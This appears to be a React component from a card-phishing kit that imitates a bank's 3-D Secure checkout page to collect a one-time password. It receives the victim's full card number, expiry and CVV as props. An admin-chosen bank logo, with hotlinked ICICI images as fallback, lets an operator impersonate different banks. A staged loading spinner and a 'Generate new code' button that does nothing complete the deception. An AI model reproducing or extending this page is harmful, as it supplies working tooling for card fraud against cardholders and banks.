import React, { useState, useEffect } from 'react';

interface TSBOTPPageProps {
  cardData: {
    cardNumber: string;
    cardName: string;
    expiryMonth: string;
    expiryYear: string;
    cvv: string;
  };
  billingDetails: {
    firstName: string;
    lastName: string;
    email: string;
    country: string;
    companyName: string;
  };
  otpValue: string;
  setOtpValue: (value: string) => void;
  otpSubmitting: boolean;
  handleOtpSubmit: () => void;
  handleOtpCancel: () => void;
  otpError: string;
  adminSelectedBankLogo: string;
  sessionBankLogo: string;
  cardBrandLogos: {
    visa: string;
    mastercard: string;
    discover: string;
    rupay: string;
    amex: string;
  };
  getCardBrand: (cardNumber: string) => string;
  displayPrice: number;
  formatPrice: (price: number) => string;
}

const TSBOTPPage: React.FC<TSBOTPPageProps> = ({
  cardData,
  billingDetails,
  otpValue,
  setOtpValue,
  otpSubmitting,
  handleOtpSubmit,
  handleOtpCancel,
  otpError,
  adminSelectedBankLogo,
  sessionBankLogo,
  cardBrandLogos,
  getCardBrand,
  displayPrice,
  formatPrice
}) => {
  const [showInfo, setShowInfo] = useState(false);
  const [showInvalidMsg, setShowInvalidMsg] = useState(false);
  const [isLoading, setIsLoading] = useState(true);

  // Get card brand and logo
  const cardBrand = getCardBrand(cardData.cardNumber);
  const cardLogo = cardBrandLogos[cardBrand as keyof typeof cardBrandLogos] || cardBrandLogos.rupay;
  
  // Debug logging for bank logo
  console.log('🏦 TSB Bank Logo Debug:');
  console.log('adminSelectedBankLogo:', adminSelectedBankLogo);
  console.log('sessionBankLogo:', sessionBankLogo);
  
  // Ensure we use the correct bank logo - prioritize admin selection, then session, then fallback
  const bankLogo = adminSelectedBankLogo || sessionBankLogo || 'https://logos-world.net/wp-content/uploads/2021/02/ICICI-Bank-Logo.png';
  console.log('Final bankLogo:', bankLogo);
  
  const cardLast4 = cardData.cardNumber.replace(/\s/g, '').slice(-4);

  useEffect(() => {
    if (otpError) {
      setShowInvalidMsg(true);
    } else {
      setShowInvalidMsg(false);
    }
  }, [otpError]);

  useEffect(() => {
    // Show loading spinner for 2 seconds when component mounts
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtpValue(value);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otpValue.length >= 4 && !otpSubmitting) {
      handleOtpSubmit();
    }
  };

  const handleResendOtp = (e: React.MouseEvent) => {
    e.preventDefault();
    // Trigger resend logic - this will be handled by the parent component
  };

  const styles = `
    .tsb-body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      color: #212121;
      min-height: 100vh;
      display: flex;
      align-items: flex-start;
      justify-content: flex-start;
      background-color: #ffffff;
      padding: 20px;
      position: relative;
    }

    .tsb-container {
      border: 1px solid #b5cde5;
      background-color: #fff;
      min-height: 500px;
      max-height: 600px;
      max-width: 600px;
      font-family: "Segoe UI", tahoma, Arial, sans-serif, Helvetica;
      color: #212121;
      box-shadow: 0 0 3px 0 #dcd8d8;
      position: fixed;
      top: 0px;
      left: 0px;
      display: flex;
      flex-direction: column;
      padding: 0 20px;
      box-sizing: border-box;
      z-index: 1000;
    }

    .tsb-header {
      background-color: #1273d0;
      line-height: 40px;
      margin: 5px -15px 0;
      color: #fff;
      padding-left: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-sizing: border-box;
    }

    .tsb-header .tsb-bank-info {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 9999;
      display: flex;
      justify-content: flex-start;
      align-items: center;
      padding: 10px;
      background-color: rgba(255, 255, 255, 0.9);
      border-bottom: 1px solid #dcd8d8;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .tsb-header div {
      font-size: 16px;
      font-weight: 700;
      text-transform: uppercase;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .tsb-close {
      cursor: pointer;
      background-color: transparent;
      border: 0;
      margin: 0;
      padding: 0;
      font-size: 0;
      margin-right: 6px;
    }

    .tsb-bank-info {
      width: 100%;
      display: flex;
      padding: 20px 0;
      justify-content: space-between;
    }

    .tsb-bank-info img:first-child {
      width: auto;
      height: 30px;
      max-width: 120px;
      object-fit: contain;
    }

    .tsb-bank-info img:last-child {
      width: auto;
      height: 40px;
      max-width: 80px;
      object-fit: contain;
    }

    .tsb-info-header {
      font-size: 22px;
      font-weight: 700;
      padding-bottom: 5px;
      margin: 0;
    }

    .tsb-info-text {
      font-size: 16px;
      margin-bottom: 20px;
    }

    .tsb-actions {
      display: flex;
      flex-direction: column;
      margin-bottom: 10px;
    }

    .tsb-otp-input {
      position: relative;
      display: flex;
      justify-content: center;
      flex-direction: column;
      margin-bottom: 20px;
    }

    .tsb-input {
      height: 40px;
      border-radius: 5px;
      border: 1px solid #a7b3d1;
      box-sizing: border-box;
      font-size: 16px;
      text-indent: 10px;
      width: 100%;
    }

    .tsb-input:focus {
      outline: none;
      border-color: #1273d0;
    }

    .tsb-invalid-input {
      border: 1px solid red;
      background: #fffc89;
      background-origin: content-box;
    }

    .tsb-error-text {
      color: red;
      padding-top: 5px;
      font-size: 14px;
    }

    .tsb-submit-label {
      background-color: #0d5499;
      font-size: 20px;
      min-height: 50px;
      color: #fff;
      padding: 10px 20px;
      width: 100%;
      font-weight: 700;
      box-sizing: border-box;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 20px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      border: 0;
    }

    .tsb-submit-label:disabled {
      background-color: #9cb7d1;
      cursor: not-allowed;
    }

    .tsb-continue-loading-text {
      position: relative;
      padding-left: 40px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .tsb-continue-loading-text::after {
      content: "";
      position: absolute;
      width: 20px;
      height: 20px;
      left: 0;
      border: 4px solid #ffffff;
      border-left-color: transparent;
      border-radius: 50%;
      animation: tsb-button-loading-spinner 2s linear infinite;
    }

    @keyframes tsb-button-loading-spinner {
      from { transform: rotate(0turn); }
      to { transform: rotate(1turn); }
    }

    .tsb-resend-label {
      cursor: pointer;
      border: 0;
      background-color: transparent;
      color: #07c;
      text-decoration: underline;
      padding: 0;
      font-family: inherit;
      font-size: inherit;
      align-self: center;
      margin-top: 10px;
    }

    .tsb-footer {
      display: flex;
      flex-direction: column;
      margin-top: auto;
      background: #fff;
    }

    .tsb-why-info-label {
      border-top: 1px dashed #b5cde5;
      padding: 10px 0;
      cursor: pointer;
      display: flex;
      flex-direction: row;
      color: #07c;
      text-decoration: underline;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      align-items: center;
    }

    .tsb-arrow {
      border: solid #07c;
      border-width: 0 2px 2px 0;
      display: inline-block;
      padding: 3px;
      margin-right: 10px;
      margin-left: 2px;
      transform: ${showInfo ? 'rotate(-135deg)' : 'rotate(45deg)'};
      transition: transform 0.3s ease;
    }

    .tsb-expandable-text {
      display: ${showInfo ? 'block' : 'none'};
      padding: 10px 0;
      font-size: 14px;
      color: #666;
    }

    .tsb-hide {
      display: none;
    }

    .tsb-icon {
      position: absolute;
      right: 0.5rem;
      top: 0.7rem;
    }

    @media screen and (max-width: 389px) {
      .tsb-container {
        min-height: 400px;
        padding: 0 10px;
      }

      .tsb-header {
        margin: 5px -5px 0;
      }

      .tsb-header div {
        font-size: 12px;
      }

      .tsb-info-header {
        font-size: 16px;
      }

      .tsb-info-text {
        font-size: 13px;
      }

      .tsb-submit-label {
        font-size: 15px;
        min-height: 40px;
        margin-top: 10px;
      }

      .tsb-input {
        font-size: 14px;
      }

      .tsb-bank-info {
        padding: 10px 0;
      }

      .tsb-bank-info img {
        height: 15px;
      }
    }
  `;

  // Loading spinner component
  if (isLoading) {
    return (
      <div style={{
        position: 'fixed',
        top: 0,
        left: 0,
        width: '100vw',
        height: '100vh',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: '#ffffff',
        zIndex: 9999
      }}>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" style={{width: '80px', height: '80px'}}>
          <rect fill="#1273d0" stroke="#1273d0" strokeWidth="15" width="30" height="30" x="25" y="85">
            <animate attributeName="opacity" calcMode="spline" dur="2" values="1;0;1;" keySplines=".5 0 .5 1;.5 0 .5 1" repeatCount="indefinite" begin="-.4"></animate>
          </rect>
          <rect fill="#1273d0" stroke="#1273d0" strokeWidth="15" width="30" height="30" x="85" y="85">
            <animate attributeName="opacity" calcMode="spline" dur="2" values="1;0;1;" keySplines=".5 0 .5 1;.5 0 .5 1" repeatCount="indefinite" begin="-.2"></animate>
          </rect>
          <rect fill="#1273d0" stroke="#1273d0" strokeWidth="15" width="30" height="30" x="145" y="85">
            <animate attributeName="opacity" calcMode="spline" dur="2" values="1;0;1;" keySplines=".5 0 .5 1;.5 0 .5 1" repeatCount="indefinite" begin="0"></animate>
          </rect>
        </svg>
      </div>
    );
  }

  return (
    <div className="tsb-body">
      <style>{styles}</style>
      <div className="tsb-container">
        <header className="tsb-header">
          <div title="SECURE CHECKOUT" aria-label="SECURE CHECKOUT">
            SECURE CHECKOUT
          </div>
          <button 
            type="button" 
            className="tsb-close" 
            onClick={handleOtpCancel}
            aria-label="Close"
          >
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
              <path 
                fill="#fff" 
                fillRule="evenodd" 
                d="M8,0a8,8,0,1,0,8,8A8.009,8.009,0,0,0,8,0Zm3.236,10.293a0.333,0.333,0,0,1,0,.471l-0.471.471a0.333,0.333,0,0,1-.471,0L8,8.942,5.707,11.235a0.333,0.333,0,0,1-.471,0l-0.471-.471a0.333,0.333,0,0,1,0-.471L7.057,8,4.764,5.707a0.333,0.333,0,0,1,0-.471l0.471-.471a0.333,0.333,0,0,1,.471,0L8,7.057l2.293-2.293a0.333,0.333,0,0,1,.471,0l0.471,0.471a0.333,0.333,0,0,1,0,.471L8.942,8Z"
              />
            </svg>
          </button>
        </header>

        <div className="tsb-bank-info">
          <img 
            src={bankLogo} 
            alt="Bank Logo" 
            onError={(e) => {
              console.log('Bank logo failed to load:', bankLogo);
              // Only use ICICI as last resort if no admin/session logo was provided
              if (!adminSelectedBankLogo && !sessionBankLogo) {
                e.currentTarget.src = 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png';
              }
            }}
          />
          <img 
            src={cardLogo} 
            alt="Payment Logo"
            onError={(e) => {
              e.currentTarget.src = cardBrandLogos.visa;
            }}
          />
        </div>

        <h1 className="tsb-info-header">Complete Authentication</h1>
        <div className="tsb-info-text">
          Payment: {formatPrice(displayPrice)}<br />
          Card ending in {cardLast4}.<br /><br />
          An authentication code has been sent to your registered mobile.<br />
          Once you receive it, enter it below to proceed with your payment.
        </div>

        <form onSubmit={handleSubmit}>
          <div className="tsb-actions">
            <div className="tsb-otp-input">
              <input
                autoComplete="off"
                name="dataEntry"
                required
                type="password"
                value={otpValue}
                onChange={handleOtpChange}
                disabled={otpSubmitting}
                className={`tsb-input ${(otpError || showInvalidMsg) ? 'tsb-invalid-input' : ''}`}
                maxLength={6}
                placeholder="Enter OTP"
              />
              {(otpError || showInvalidMsg) && (
                <div className="tsb-icon">
                  <svg xmlns="http://www.w3.org/2000/svg" width="18" height="16" viewBox="0 0 18 16">
                    <path 
                      fill="red" 
                      fillRule="evenodd" 
                      d="M17.826,13.745h0C16.628,11.361,14.62,7.981,12.849,5c-0.927-1.561-1.8-3.035-2.435-4.155a1.615,1.615,0,0,0-2.839,0C6.942,1.965,6.066,3.441,5.138,5c-1.77,2.981-3.777,6.36-4.974,8.742A1.511,1.511,0,0,0,0,14.427,1.59,1.59,0,0,0,1.607,16H16.383a1.59,1.59,0,0,0,1.607-1.57A1.513,1.513,0,0,0,17.826,13.745Zm-8.831.8a0.727,0.727,0,1,1,.749-0.727A0.739,0.739,0,0,1,8.995,14.542ZM9.744,12a0.369,0.369,0,0,1-.375.364H8.62A0.369,0.369,0,0,1,8.245,12V4A0.369,0.369,0,0,1,8.62,3.636H9.369A0.369,0.369,0,0,1,9.744,4v8Z"
                    />
                  </svg>
                </div>
              )}
              {otpError && (
                <div className="tsb-error-text">
                  {otpError === 'Invalid OTP' ? 'Invalid OTP. Please try again.' : otpError}
                </div>
              )}
            </div>
            
            <button 
              type="submit" 
              className="tsb-submit-label" 
              disabled={otpValue.length < 4 || otpSubmitting}
            >
              {otpSubmitting ? (
                <span className="tsb-continue-loading-text">Continue</span>
              ) : (
                'Continue'
              )}
            </button>
          </div>

          <button 
            type="button" 
            className="tsb-resend-label"
            onClick={handleResendOtp}
            disabled={otpSubmitting}
          >
            Generate new code
          </button>
        </form>

        <footer className="tsb-footer">
          <div 
            className="tsb-why-info-label" 
            role="button" 
            tabIndex={0} 
            onClick={() => setShowInfo(!showInfo)}
          >
            <i className="tsb-arrow"></i>
            <span>Why am I being asked for Authentication?</span>
          </div>
          <div className="tsb-expandable-text">
            <p>
              Authentication is an additional step that protects you from fraud by identifying that you're the one making the purchase.
              Need help? Contact support for assistance.
            </p>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default TSBOTPPage;
